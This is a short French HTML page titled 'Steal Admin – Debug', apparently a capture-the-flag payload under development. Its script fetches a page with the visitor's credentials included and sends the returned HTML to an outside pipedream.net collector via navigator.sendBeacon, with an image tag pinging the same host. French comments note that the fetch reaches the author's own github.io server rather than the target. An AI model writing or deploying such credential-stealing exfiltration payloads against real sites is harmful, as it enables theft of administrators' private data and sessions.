<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <title>Steal Admin – Debug</title>
  </head>
  <body>
    <h1>Dump admin :</h1>
    <pre id="out">en attente…</pre>

    <!-- 1️⃣ Requête statique pour prouver que la page arrive bien -->
    <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=static" alt="ok" />

    <script>
      (async () => {
        // ❌ fetch("/") va TOUJOURS appeler la racine de TON serveur
        //    (ici : bastien750.github.io/), pas celle du CTF.
        const html = await fetch("/", { credentials: "include" }).then((r) =>
          r.text()
        );
        out.textContent = html; // ← tu mets dans le <pre> ce que TU as servi
        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
      })();
    </script>
  </body>
</html>
